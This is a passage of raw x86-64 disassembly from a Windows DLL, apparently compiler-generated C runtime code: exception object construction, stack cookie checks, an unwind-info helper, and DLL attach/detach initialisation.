   180001d79:	48 8d 05 00 07 01 00 	lea    0x10700(%rip),%rax        # 0x180012480
   180001d80:	48 89 03             	mov    %rax,(%rbx)
   180001d83:	48 8b c3             	mov    %rbx,%rax
   180001d86:	48 83 c4 20          	add    $0x20,%rsp
   180001d8a:	5b                   	pop    %rbx
   180001d8b:	c3                   	ret
   180001d8c:	cc                   	int3
   180001d8d:	cc                   	int3
   180001d8e:	cc                   	int3
   180001d8f:	cc                   	int3
   180001d90:	40 53                	rex push %rbx
   180001d92:	48 83 ec 30          	sub    $0x30,%rsp
   180001d96:	48 8b d9             	mov    %rcx,%rbx
   180001d99:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   180001d9e:	48 8b c2             	mov    %rdx,%rax
   180001da1:	48 8d 0d 60 05 01 00 	lea    0x10560(%rip),%rcx        # 0x180012308
   180001da8:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180001dac:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180001db1:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001db4:	48 89 0b             	mov    %rcx,(%rbx)
   180001db7:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001dbc:	0f 11 02             	movups %xmm0,(%rdx)
   180001dbf:	e8 dc 10 00 00       	call   0x180002ea0
   180001dc4:	48 8d 05 b5 06 01 00 	lea    0x106b5(%rip),%rax        # 0x180012480
   180001dcb:	48 89 03             	mov    %rax,(%rbx)
   180001dce:	48 8b c3             	mov    %rbx,%rax
   180001dd1:	48 83 c4 30          	add    $0x30,%rsp
   180001dd5:	5b                   	pop    %rbx
   180001dd6:	c3                   	ret
   180001dd7:	cc                   	int3
   180001dd8:	cc                   	int3
   180001dd9:	cc                   	int3
   180001dda:	cc                   	int3
   180001ddb:	cc                   	int3
   180001ddc:	cc                   	int3
   180001ddd:	cc                   	int3
   180001dde:	cc                   	int3
   180001ddf:	cc                   	int3
   180001de0:	40 53                	rex push %rbx
   180001de2:	48 83 ec 20          	sub    $0x20,%rsp
   180001de6:	48 8b d9             	mov    %rcx,%rbx
   180001de9:	48 8b c2             	mov    %rdx,%rax
   180001dec:	48 8d 0d 15 05 01 00 	lea    0x10515(%rip),%rcx        # 0x180012308
   180001df3:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001df6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180001dfa:	48 89 0b             	mov    %rcx,(%rbx)
   180001dfd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001e01:	0f 11 02             	movups %xmm0,(%rdx)
   180001e04:	e8 97 10 00 00       	call   0x180002ea0
   180001e09:	48 8d 05 58 06 01 00 	lea    0x10658(%rip),%rax        # 0x180012468
   180001e10:	48 89 03             	mov    %rax,(%rbx)
   180001e13:	48 8b c3             	mov    %rbx,%rax
   180001e16:	48 83 c4 20          	add    $0x20,%rsp
   180001e1a:	5b                   	pop    %rbx
   180001e1b:	c3                   	ret
   180001e1c:	cc                   	int3
   180001e1d:	cc                   	int3
   180001e1e:	cc                   	int3
   180001e1f:	cc                   	int3
   180001e20:	48 83 ec 48          	sub    $0x48,%rsp
   180001e24:	48 8b d1             	mov    %rcx,%rdx
   180001e27:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001e2c:	e8 5f ff ff ff       	call   0x180001d90
   180001e31:	48 8d 15 20 9c 01 00 	lea    0x19c20(%rip),%rdx        # 0x18001ba58
   180001e38:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001e3d:	e8 3e 11 00 00       	call   0x180002f80
   180001e42:	cc                   	int3
   180001e43:	cc                   	int3
   180001e44:	cc                   	int3
   180001e45:	cc                   	int3
   180001e46:	cc                   	int3
   180001e47:	cc                   	int3
   180001e48:	cc                   	int3
   180001e49:	cc                   	int3
   180001e4a:	cc                   	int3
   180001e4b:	cc                   	int3
   180001e4c:	cc                   	int3
   180001e4d:	cc                   	int3
   180001e4e:	cc                   	int3
   180001e4f:	cc                   	int3
   180001e50:	40 53                	rex push %rbx
   180001e52:	48 83 ec 20          	sub    $0x20,%rsp
   180001e56:	48 8b d9             	mov    %rcx,%rbx
   180001e59:	e8 52 63 00 00       	call   0x1800081b0
   180001e5e:	48 85 c0             	test   %rax,%rax
   180001e61:	75 19                	jne    0x180001e7c
   180001e63:	48 8b cb             	mov    %rbx,%rcx
   180001e66:	e8 45 62 00 00       	call   0x1800080b0
   180001e6b:	85 c0                	test   %eax,%eax
   180001e6d:	74 13                	je     0x180001e82
   180001e6f:	48 8b cb             	mov    %rbx,%rcx
   180001e72:	e8 39 63 00 00       	call   0x1800081b0
   180001e77:	48 85 c0             	test   %rax,%rax
   180001e7a:	74 e7                	je     0x180001e63
   180001e7c:	48 83 c4 20          	add    $0x20,%rsp
   180001e80:	5b                   	pop    %rbx
   180001e81:	c3                   	ret
   180001e82:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   180001e86:	74 06                	je     0x180001e8e
   180001e88:	e8 83 06 00 00       	call   0x180002510
   180001e8d:	cc                   	int3
   180001e8e:	e8 0d f9 ff ff       	call   0x1800017a0
   180001e93:	cc                   	int3
   180001e94:	cc                   	int3
   180001e95:	cc                   	int3
   180001e96:	cc                   	int3
   180001e97:	cc                   	int3
   180001e98:	cc                   	int3
   180001e99:	cc                   	int3
   180001e9a:	cc                   	int3
   180001e9b:	cc                   	int3
   180001e9c:	cc                   	int3
   180001e9d:	cc                   	int3
   180001e9e:	cc                   	int3
   180001e9f:	cc                   	int3
   180001ea0:	e9 8b 06 00 00       	jmp    0x180002530
   180001ea5:	cc                   	int3
   180001ea6:	cc                   	int3
   180001ea7:	cc                   	int3
   180001ea8:	cc                   	int3
   180001ea9:	cc                   	int3
   180001eaa:	cc                   	int3
   180001eab:	cc                   	int3
   180001eac:	cc                   	int3
   180001ead:	cc                   	int3
   180001eae:	cc                   	int3
   180001eaf:	cc                   	int3
   180001eb0:	b9 02 00 00 00       	mov    $0x2,%ecx
   180001eb5:	cd 29                	int    $0x29
   180001eb7:	c3                   	ret
   180001eb8:	cc                   	int3
   180001eb9:	cc                   	int3
   180001eba:	cc                   	int3
   180001ebb:	cc                   	int3
   180001ebc:	cc                   	int3
   180001ebd:	cc                   	int3
   180001ebe:	cc                   	int3
   180001ebf:	cc                   	int3
   180001ec0:	48 83 ec 28          	sub    $0x28,%rsp
   180001ec4:	4d 8b 41 38          	mov    0x38(%r9),%r8
   180001ec8:	48 8b ca             	mov    %rdx,%rcx
   180001ecb:	49 8b d1             	mov    %r9,%rdx
   180001ece:	e8 0d 00 00 00       	call   0x180001ee0
   180001ed3:	b8 01 00 00 00       	mov    $0x1,%eax
   180001ed8:	48 83 c4 28          	add    $0x28,%rsp
   180001edc:	c3                   	ret
   180001edd:	cc                   	int3
   180001ede:	cc                   	int3
   180001edf:	cc                   	int3
   180001ee0:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180001ee5:	57                   	push   %rdi
   180001ee6:	48 83 ec 20          	sub    $0x20,%rsp
   180001eea:	49 63 30             	movslq (%r8),%rsi
   180001eed:	48 8b f9             	mov    %rcx,%rdi
   180001ef0:	40 f6 c6 04          	test   $0x4,%sil
   180001ef4:	74 15                	je     0x180001f0b
   180001ef6:	41 8b 40 08          	mov    0x8(%r8),%eax
   180001efa:	4d 63 50 04          	movslq 0x4(%r8),%r10
   180001efe:	f7 d8                	neg    %eax
   180001f00:	4c 63 c0             	movslq %eax,%r8
   180001f03:	4c 03 d1             	add    %rcx,%r10
   180001f06:	4d 23 d0             	and    %r8,%r10
   180001f09:	eb 03                	jmp    0x180001f0e
   180001f0b:	4c 8b d7             	mov    %rdi,%r10
   180001f0e:	48 8b 42 10          	mov    0x10(%rdx),%rax
   180001f12:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180001f17:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   180001f1c:	44 8b 40 08          	mov    0x8(%rax),%r8d
   180001f20:	4c 03 42 08          	add    0x8(%rdx),%r8
   180001f24:	41 0f b6 00          	movzbl (%r8),%eax
   180001f28:	41 0f b6 48 03       	movzbl 0x3(%r8),%ecx
   180001f2d:	24 07                	and    $0x7,%al
   180001f2f:	3c 03                	cmp    $0x3,%al
   180001f31:	73 0d                	jae    0x180001f40
   180001f33:	f6 c1 0f             	test   $0xf,%cl
   180001f36:	74 13                	je     0x180001f4b
   180001f38:	44 8b c9             	mov    %ecx,%r9d
   180001f3b:	e9 fd 00 00 00       	jmp    0x18000203d
   180001f40:	44 8b d9             	mov    %ecx,%r11d
   180001f43:	8b d1                	mov    %ecx,%edx
   180001f45:	41 83 e3 1f          	and    $0x1f,%r11d
   180001f49:	75 08                	jne    0x180001f53
   180001f4b:	45 33 c9             	xor    %r9d,%r9d
   180001f4e:	e9 ee 00 00 00       	jmp    0x180002041
   180001f53:	49 83 c0 04          	add    $0x4,%r8
   180001f57:	41 8b c3             	mov    %r11d,%eax
   180001f5a:	45 33 c9             	xor    %r9d,%r9d
   180001f5d:	c1 ea 05             	shr    $0x5,%edx
   180001f60:	4c 03 c0             	add    %rax,%r8
   180001f63:	41 8b c9             	mov    %r9d,%ecx
   180001f66:	85 d2                	test   %edx,%edx
   180001f68:	74 22                	je     0x180001f8c
   180001f6a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180001f70:	41 0f b6 00          	movzbl (%r8),%eax
   180001f74:	49 83 c0 03          	add    $0x3,%r8
   180001f78:	c1 e8 03             	shr    $0x3,%eax
   180001f7b:	85 c0                	test   %eax,%eax
   180001f7d:	74 07                	je     0x180001f86
   180001f7f:	49 83 c0 03          	add    $0x3,%r8
   180001f83:	4c 03 c0             	add    %rax,%r8
   180001f86:	ff c1                	inc    %ecx
   180001f88:	3b ca                	cmp    %edx,%ecx
   180001f8a:	72 e4                	jb     0x180001f70
   180001f8c:	41 8b d9             	mov    %r9d,%ebx
   180001f8f:	45 85 db             	test   %r11d,%r11d
   180001f92:	0f 84 a9 00 00 00    	je     0x180002041
   180001f98:	48 8d 2d 61 e0 ff ff 	lea    -0x1f9f(%rip),%rbp        # 0x180000000
   180001f9f:	90                   	nop
   180001fa0:	41 0f b6 00          	movzbl (%r8),%eax
   180001fa4:	0f b6 d0             	movzbl %al,%edx
   180001fa7:	3c 03                	cmp    $0x3,%al
   180001fa9:	76 19                	jbe    0x180001fc4
   180001fab:	80 e2 0f             	and    $0xf,%dl
   180001fae:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   180001fb1:	80 f9 02             	cmp    $0x2,%cl
   180001fb4:	76 0e                	jbe    0x180001fc4
   180001fb6:	0f b6 d0             	movzbl %al,%edx
   180001fb9:	80 e2 07             	and    $0x7,%dl
   180001fbc:	8d 4a fc             	lea    -0x4(%rdx),%ecx
   180001fbf:	80 f9 03             	cmp    $0x3,%cl
   180001fc2:	77 24                	ja     0x180001fe8
   180001fc4:	84 d2                	test   %dl,%dl
   180001fc6:	74 70                	je     0x180002038
   180001fc8:	3c 03                	cmp    $0x3,%al
   180001fca:	76 2b                	jbe    0x180001ff7
   180001fcc:	0f b6 d0             	movzbl %al,%edx
   180001fcf:	80 e2 0f             	and    $0xf,%dl
   180001fd2:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   180001fd5:	80 f9 02             	cmp    $0x2,%cl
   180001fd8:	76 16                	jbe    0x180001ff0
   180001fda:	0f b6 d0             	movzbl %al,%edx
   180001fdd:	80 e2 07             	and    $0x7,%dl
   180001fe0:	8d 4a fc             	lea    -0x4(%rdx),%ecx
   180001fe3:	80 f9 03             	cmp    $0x3,%cl
   180001fe6:	76 08                	jbe    0x180001ff0
   180001fe8:	24 3f                	and    $0x3f,%al
   180001fea:	3c 20                	cmp    $0x20,%al
   180001fec:	75 7b                	jne    0x180002069
   180001fee:	eb 07                	jmp    0x180001ff7
   180001ff0:	0f b6 c2             	movzbl %dl,%eax
   180001ff3:	3c 20                	cmp    $0x20,%al
   180001ff5:	77 72                	ja     0x180002069
   180001ff7:	0f b6 c0             	movzbl %al,%eax
   180001ffa:	0f b6 84 28 84 20 00 	movzbl 0x2084(%rax,%rbp,1),%eax
   180002001:	00 
   180002002:	8b 8c 85 70 20 00 00 	mov    0x2070(%rbp,%rax,4),%ecx
   180002009:	48 03 cd             	add    %rbp,%rcx
   18000200c:	ff e1                	jmp    *%rcx
   18000200e:	b8 01 00 00 00       	mov    $0x1,%eax
   180002013:	eb 13                	jmp    0x180002028
   180002015:	b8 02 00 00 00       	mov    $0x2,%eax
   18000201a:	eb 0c                	jmp    0x180002028
   18000201c:	b8 03 00 00 00       	mov    $0x3,%eax
   180002021:	eb 05                	jmp    0x180002028
   180002023:	b8 05 00 00 00       	mov    $0x5,%eax
   180002028:	4c 03 c0             	add    %rax,%r8
   18000202b:	ff c3                	inc    %ebx
   18000202d:	41 3b db             	cmp    %r11d,%ebx
   180002030:	0f 82 6a ff ff ff    	jb     0x180001fa0
   180002036:	eb 09                	jmp    0x180002041
   180002038:	45 0f b6 48 01       	movzbl 0x1(%r8),%r9d
   18000203d:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   180002041:	49 8d 0c 39          	lea    (%r9,%rdi,1),%rcx
   180002045:	48 8b c6             	mov    %rsi,%rax
   180002048:	48 83 e0 f8          	and    $0xfffffffffffffff8,%rax
   18000204c:	4a 33 0c 10          	xor    (%rax,%r10,1),%rcx
   180002050:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180002055:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000205a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000205f:	48 83 c4 20          	add    $0x20,%rsp
   180002063:	5f                   	pop    %rdi
   180002064:	e9 c7 00 00 00       	jmp    0x180002130
   180002069:	e8 42 fe ff ff       	call   0x180001eb0
   18000206e:	cc                   	int3
   18000206f:	90                   	nop
   180002070:	15 20 00 00 23       	adc    $0x23000020,%eax
   180002075:	20 00                	and    %al,(%rax)
   180002077:	00 1c 20             	add    %bl,(%rax,%riz,1)
   18000207a:	00 00                	add    %al,(%rax)
   18000207c:	0e                   	(bad)
   18000207d:	20 00                	and    %al,(%rax)
   18000207f:	00 69 20             	add    %ch,0x20(%rcx)
   180002082:	00 00                	add    %al,(%rax)
   180002084:	00 01                	add    %al,(%rcx)
   180002086:	02 00                	add    (%rax),%al
   180002088:	03 01                	add    (%rcx),%eax
   18000208a:	02 03                	add    (%rbx),%al
   18000208c:	03 01                	add    (%rcx),%eax
   18000208e:	02 04 04             	add    (%rsp,%rax,1),%al
   180002091:	04 04                	add    $0x4,%al
   180002093:	04 04                	add    $0x4,%al
   180002095:	04 04                	add    $0x4,%al
   180002097:	04 04                	add    $0x4,%al
   180002099:	04 04                	add    $0x4,%al
   18000209b:	04 04                	add    $0x4,%al
   18000209d:	04 04                	add    $0x4,%al
   18000209f:	04 04                	add    $0x4,%al
   1800020a1:	04 04                	add    $0x4,%al
   1800020a3:	04 00                	add    $0x0,%al
   1800020a5:	cc                   	int3
   1800020a6:	cc                   	int3
   1800020a7:	cc                   	int3
   1800020a8:	cc                   	int3
   1800020a9:	cc                   	int3
   1800020aa:	cc                   	int3
   1800020ab:	cc                   	int3
   1800020ac:	cc                   	int3
   1800020ad:	cc                   	int3
   1800020ae:	cc                   	int3
   1800020af:	cc                   	int3
   1800020b0:	40 53                	rex push %rbx
   1800020b2:	55                   	push   %rbp
   1800020b3:	56                   	push   %rsi
   1800020b4:	57                   	push   %rdi
   1800020b5:	41 56                	push   %r14
   1800020b7:	48 83 ec 20          	sub    $0x20,%rsp
   1800020bb:	49 8b 59 38          	mov    0x38(%r9),%rbx
   1800020bf:	48 8b f2             	mov    %rdx,%rsi
   1800020c2:	4d 8b f0             	mov    %r8,%r14
   1800020c5:	48 8b e9             	mov    %rcx,%rbp
   1800020c8:	49 8b d1             	mov    %r9,%rdx
   1800020cb:	48 8b ce             	mov    %rsi,%rcx
   1800020ce:	49 8b f9             	mov    %r9,%rdi
   1800020d1:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   1800020d5:	e8 06 fe ff ff       	call   0x180001ee0
   1800020da:	f6 45 04 66          	testb  $0x66,0x4(%rbp)
   1800020de:	b8 00 00 00 00       	mov    $0x0,%eax
   1800020e3:	0f 95 c0             	setne  %al
   1800020e6:	ff c0                	inc    %eax
   1800020e8:	85 43 04             	test   %eax,0x4(%rbx)
   1800020eb:	74 1b                	je     0x180002108
   1800020ed:	4c 8b cf             	mov    %rdi,%r9
   1800020f0:	4d 8b c6             	mov    %r14,%r8
   1800020f3:	48 8b d6             	mov    %rsi,%rdx
   1800020f6:	48 8b cd             	mov    %rbp,%rcx
   1800020f9:	48 83 c4 20          	add    $0x20,%rsp
   1800020fd:	41 5e                	pop    %r14
   1800020ff:	5f                   	pop    %rdi
   180002100:	5e                   	pop    %rsi
   180002101:	5d                   	pop    %rbp
   180002102:	5b                   	pop    %rbx
   180002103:	e9 e8 1c 00 00       	jmp    0x180003df0
   180002108:	b8 01 00 00 00       	mov    $0x1,%eax
   18000210d:	48 83 c4 20          	add    $0x20,%rsp
   180002111:	41 5e                	pop    %r14
   180002113:	5f                   	pop    %rdi
   180002114:	5e                   	pop    %rsi
   180002115:	5d                   	pop    %rbp
   180002116:	5b                   	pop    %rbx
   180002117:	c3                   	ret
   180002118:	cc                   	int3
   180002119:	cc                   	int3
   18000211a:	cc                   	int3
   18000211b:	cc                   	int3
   18000211c:	cc                   	int3
   18000211d:	cc                   	int3
   18000211e:	cc                   	int3
   18000211f:	cc                   	int3
   180002120:	cc                   	int3
   180002121:	cc                   	int3
   180002122:	cc                   	int3
   180002123:	cc                   	int3
   180002124:	cc                   	int3
   180002125:	cc                   	int3
   180002126:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000212d:	00 00 00 
   180002130:	48 3b 0d c9 ae 01 00 	cmp    0x1aec9(%rip),%rcx        # 0x18001d000
   180002137:	75 10                	jne    0x180002149
   180002139:	48 c1 c1 10          	rol    $0x10,%rcx
   18000213d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   180002142:	75 01                	jne    0x180002145
   180002144:	c3                   	ret
   180002145:	48 c1 c9 10          	ror    $0x10,%rcx
   180002149:	e9 62 fd ff ff       	jmp    0x180001eb0
   18000214e:	cc                   	int3
   18000214f:	cc                   	int3
   180002150:	40 53                	rex push %rbx
   180002152:	48 83 ec 20          	sub    $0x20,%rsp
   180002156:	48 8d 05 3b 03 01 00 	lea    0x1033b(%rip),%rax        # 0x180012498
   18000215d:	48 8b d9             	mov    %rcx,%rbx
   180002160:	48 89 01             	mov    %rax,(%rcx)
   180002163:	f6 c2 01             	test   $0x1,%dl
   180002166:	74 0a                	je     0x180002172
   180002168:	ba 18 00 00 00       	mov    $0x18,%edx
   18000216d:	e8 2e fd ff ff       	call   0x180001ea0
   180002172:	48 8b c3             	mov    %rbx,%rax
   180002175:	48 83 c4 20          	add    $0x20,%rsp
   180002179:	5b                   	pop    %rbx
   18000217a:	c3                   	ret
   18000217b:	cc                   	int3
   18000217c:	cc                   	int3
   18000217d:	cc                   	int3
   18000217e:	cc                   	int3
   18000217f:	cc                   	int3
   180002180:	48 83 ec 28          	sub    $0x28,%rsp
   180002184:	85 d2                	test   %edx,%edx
   180002186:	74 3f                	je     0x1800021c7
   180002188:	83 ea 01             	sub    $0x1,%edx
   18000218b:	74 2e                	je     0x1800021bb
   18000218d:	83 ea 01             	sub    $0x1,%edx
   180002190:	74 1c                	je     0x1800021ae
   180002192:	83 fa 01             	cmp    $0x1,%edx
   180002195:	74 0a                	je     0x1800021a1
   180002197:	b8 01 00 00 00       	mov    $0x1,%eax
   18000219c:	48 83 c4 28          	add    $0x28,%rsp
   1800021a0:	c3                   	ret
   1800021a1:	e8 fa 05 00 00       	call   0x1800027a0
   1800021a6:	0f b6 c0             	movzbl %al,%eax
   1800021a9:	48 83 c4 28          	add    $0x28,%rsp
   1800021ad:	c3                   	ret
   1800021ae:	e8 bd 05 00 00       	call   0x180002770
   1800021b3:	0f b6 c0             	movzbl %al,%eax
   1800021b6:	48 83 c4 28          	add    $0x28,%rsp
   1800021ba:	c3                   	ret
   1800021bb:	49 8b d0             	mov    %r8,%rdx
   1800021be:	48 83 c4 28          	add    $0x28,%rsp
   1800021c2:	e9 19 00 00 00       	jmp    0x1800021e0
   1800021c7:	4d 85 c0             	test   %r8,%r8
   1800021ca:	0f 95 c1             	setne  %cl
   1800021cd:	48 83 c4 28          	add    $0x28,%rsp
   1800021d1:	e9 1a 01 00 00       	jmp    0x1800022f0
   1800021d6:	cc                   	int3
   1800021d7:	cc                   	int3
   1800021d8:	cc                   	int3
   1800021d9:	cc                   	int3
   1800021da:	cc                   	int3
   1800021db:	cc                   	int3
   1800021dc:	cc                   	int3
   1800021dd:	cc                   	int3
   1800021de:	cc                   	int3
   1800021df:	cc                   	int3
   1800021e0:	40 53                	rex push %rbx
   1800021e2:	56                   	push   %rsi
   1800021e3:	57                   	push   %rdi
   1800021e4:	41 56                	push   %r14
   1800021e6:	48 83 ec 28          	sub    $0x28,%rsp
   1800021ea:	48 8b f2             	mov    %rdx,%rsi
   1800021ed:	4c 8b f1             	mov    %rcx,%r14
   1800021f0:	33 c9                	xor    %ecx,%ecx
   1800021f2:	e8 79 06 00 00       	call   0x180002870
   1800021f7:	84 c0                	test   %al,%al
   1800021f9:	0f 84 ce 00 00 00    	je     0x1800022cd
   1800021ff:	e8 5c 04 00 00       	call   0x180002660
   180002204:	0f b6 d8             	movzbl %al,%ebx
   180002207:	88 44 24 60          	mov    %al,0x60(%rsp)
   18000220b:	40 b7 01             	mov    $0x1,%dil
   18000220e:	83 3d cb b9 01 00 00 	cmpl   $0x0,0x1b9cb(%rip)        # 0x18001dbe0
   180002215:	0f 85 be 00 00 00    	jne    0x1800022d9
   18000221b:	c7 05 bb b9 01 00 01 	movl   $0x1,0x1b9bb(%rip)        # 0x18001dbe0
   180002222:	00 00 00 
   180002225:	e8 c6 04 00 00       	call   0x1800026f0
   18000222a:	84 c0                	test   %al,%al
   18000222c:	74 4f                	je     0x18000227d
   18000222e:	e8 ad 07 00 00       	call   0x1800029e0
   180002233:	e8 c8 03 00 00       	call   0x180002600
   180002238:	e8 03 04 00 00       	call   0x180002640
   18000223d:	48 8d 15 74 00 01 00 	lea    0x10074(%rip),%rdx        # 0x1800122b8
   180002244:	48 8d 0d 4d 00 01 00 	lea    0x1004d(%rip),%rcx        # 0x180012298
   18000224b:	e8 a0 5f 00 00       	call   0x1800081f0
   180002250:	85 c0                	test   %eax,%eax
   180002252:	75 29                	jne    0x18000227d
   180002254:	e8 57 04 00 00       	call   0x1800026b0
   180002259:	84 c0                	test   %al,%al
   18000225b:	74 20                	je     0x18000227d
   18000225d:	48 8d 15 2c 00 01 00 	lea    0x1002c(%rip),%rdx        # 0x180012290
   180002264:	48 8d 0d 1d 00 01 00 	lea    0x1001d(%rip),%rcx        # 0x180012288
   18000226b:	e8 48 5f 00 00       	call   0x1800081b8
   180002270:	c7 05 66 b9 01 00 02 	movl   $0x2,0x1b966(%rip)        # 0x18001dbe0
   180002277:	00 00 00 
   18000227a:	40 32 ff             	xor    %dil,%dil
   18000227d:	0f b6 cb             	movzbl %bl,%ecx
   180002280:	e8 cb 06 00 00       	call   0x180002950
   180002285:	40 84 ff             	test   %dil,%dil
   180002288:	75 43                	jne    0x1800022cd
   18000228a:	e8 21 07 00 00       	call   0x1800029b0
   18000228f:	48 8b d8             	mov    %rax,%rbx
   180002292:	48 83 38 00          	cmpq   $0x0,(%rax)
   180002296:	74 20                	je     0x1800022b8
   180002298:	48 8b c8             	mov    %rax,%rcx
   18000229b:	e8 10 06 00 00       	call   0x1800028b0
   1800022a0:	84 c0                	test   %al,%al
   1800022a2:	74 14                	je     0x1800022b8
   1800022a4:	4c 8b c6             	mov    %rsi,%r8
   1800022a7:	ba 02 00 00 00       	mov    $0x2,%edx
   1800022ac:	49 8b ce             	mov    %r14,%rcx
   1800022af:	48 8b 03             	mov    (%rbx),%rax
   1800022b2:	ff 15 a8 ff 00 00    	call   *0xffa8(%rip)        # 0x180012260
   1800022b8:	ff 05 f2 b8 01 00    	incl   0x1b8f2(%rip)        # 0x18001dbb0
   1800022be:	b8 01 00 00 00       	mov    $0x1,%eax
   1800022c3:	48 83 c4 28          	add    $0x28,%rsp
   1800022c7:	41 5e                	pop    %r14
   1800022c9:	5f                   	pop    %rdi
   1800022ca:	5e                   	pop    %rsi
   1800022cb:	5b                   	pop    %rbx
   1800022cc:	c3                   	ret
   1800022cd:	33 c0                	xor    %eax,%eax
   1800022cf:	48 83 c4 28          	add    $0x28,%rsp
   1800022d3:	41 5e                	pop    %r14
   1800022d5:	5f                   	pop    %rdi
   1800022d6:	5e                   	pop    %rsi
   1800022d7:	5b                   	pop    %rbx
   1800022d8:	c3                   	ret
   1800022d9:	b9 07 00 00 00       	mov    $0x7,%ecx
   1800022de:	e8 ed 06 00 00       	call   0x1800029d0
   1800022e3:	90                   	nop
   1800022e4:	cc                   	int3
   1800022e5:	cc                   	int3
   1800022e6:	cc                   	int3
   1800022e7:	cc                   	int3
   1800022e8:	cc                   	int3
   1800022e9:	cc                   	int3
   1800022ea:	cc                   	int3
   1800022eb:	cc                   	int3
   1800022ec:	cc                   	int3
   1800022ed:	cc                   	int3
   1800022ee:	cc                   	int3
   1800022ef:	cc                   	int3
   1800022f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800022f5:	57                   	push   %rdi
   1800022f6:	48 83 ec 30          	sub    $0x30,%rsp
   1800022fa:	0f b6 f9             	movzbl %cl,%edi
   1800022fd:	8b 05 ad b8 01 00    	mov    0x1b8ad(%rip),%eax        # 0x18001dbb0
   180002303:	85 c0                	test   %eax,%eax
   180002305:	7f 0d                	jg     0x180002314
   180002307:	33 c0                	xor    %eax,%eax
   180002309:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000230e:	48 83 c4 30          	add    $0x30,%rsp
   180002312:	5f                   	pop    %rdi
   180002313:	c3                   	ret
   180002314:	ff c8                	dec    %eax
   180002316:	89 05 94 b8 01 00    	mov    %eax,0x1b894(%rip)        # 0x18001dbb0
   18000231c:	e8 3f 03 00 00       	call   0x180002660
   180002321:	0f b6 d8             	movzbl %al,%ebx
   180002324:	88 44 24 20          	mov    %al,0x20(%rsp)
   180002328:	83 3d b1 b8 01 00 02 	cmpl   $0x2,0x1b8b1(%rip)        # 0x18001dbe0
   18000232f:	75 4c                	jne    0x18000237d
   180002331:	e8 da 04 00 00       	call   0x180002810
   180002336:	e8 d5 02 00 00       	call   0x180002610
   18000233b:	e8 f0 06 00 00       	call   0x180002a30
   180002340:	c7 05 96 b8 01 00 00 	movl   $0x0,0x1b896(%rip)        # 0x18001dbe0
   180002347:	00 00 00 
   18000234a:	0f b6 cb             	movzbl %bl,%ecx
   18000234d:	e8 fe 05 00 00       	call   0x180002950
   180002352:	33 d2                	xor    %edx,%edx
   180002354:	40 0f b6 cf          	movzbl %dil,%ecx
   180002358:	e8 23 06 00 00       	call   0x180002980
   18000235d:	0f b6 d8             	movzbl %al,%ebx
   180002360:	e8 eb 04 00 00       	call   0x180002850
   180002365:	8b c3                	mov    %ebx,%eax
   180002367:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000236c:	48 83 c4 30          	add    $0x30,%rsp
   180002370:	5f                   	pop    %rdi
   180002371:	c3                   	ret
   180002372:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180002377:	48 83 c4 30          	add    $0x30,%rsp
   18000237b:	5f                   	pop    %rdi
   18000237c:	c3                   	ret
   18000237d:	b9 07 00 00 00       	mov    $0x7,%ecx
   180002382:	e8 49 06 00 00       	call   0x1800029d0
   180002387:	90                   	nop
   180002388:	90                   	nop
   180002389:	cc                   	int3
   18000238a:	cc                   	int3
   18000238b:	cc                   	int3
   18000238c:	cc                   	int3
   18000238d:	cc                   	int3
   18000238e:	cc                   	int3
   18000238f:	cc                   	int3
   180002390:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002395:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000239a:	89 54 24 10          	mov    %edx,0x10(%rsp)
   18000239e:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1800023a3:	56                   	push   %rsi
   1800023a4:	57                   	push   %rdi
   1800023a5:	41 56                	push   %r14
   1800023a7:	48 83 ec 40          	sub    $0x40,%rsp
   1800023ab:	49 8b f0             	mov    %r8,%rsi
   1800023ae:	8b fa                	mov    %edx,%edi
   1800023b0:	4c 8b f1             	mov    %rcx,%r14
   1800023b3:	85 d2                	test   %edx,%edx
   1800023b5:	75 18                	jne    0x1800023cf
   1800023b7:	39 15 f3 b7 01 00    	cmp    %edx,0x1b7f3(%rip)        # 0x18001dbb0
   1800023bd:	7f 10                	jg     0x1800023cf
   1800023bf:	33 c0                	xor    %eax,%eax
   1800023c1:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   1800023c6:	48 83 c4 40          	add    $0x40,%rsp
   1800023ca:	41 5e                	pop    %r14
   1800023cc:	5f                   	pop    %rdi
   1800023cd:	5e                   	pop    %rsi
   1800023ce:	c3                   	ret
   1800023cf:	8d 42 ff             	lea    -0x1(%rdx),%eax
   1800023d2:	83 f8 01             	cmp    $0x1,%eax
   1800023d5:	77 42                	ja     0x180002419
   1800023d7:	48 8b 05 c2 00 01 00 	mov    0x100c2(%rip),%rax        # 0x1800124a0
   1800023de:	48 85 c0             	test   %rax,%rax
   1800023e1:	75 07                	jne    0x1800023ea
   1800023e3:	bb 01 00 00 00       	mov    $0x1,%ebx
   1800023e8:	eb 08                	jmp    0x1800023f2
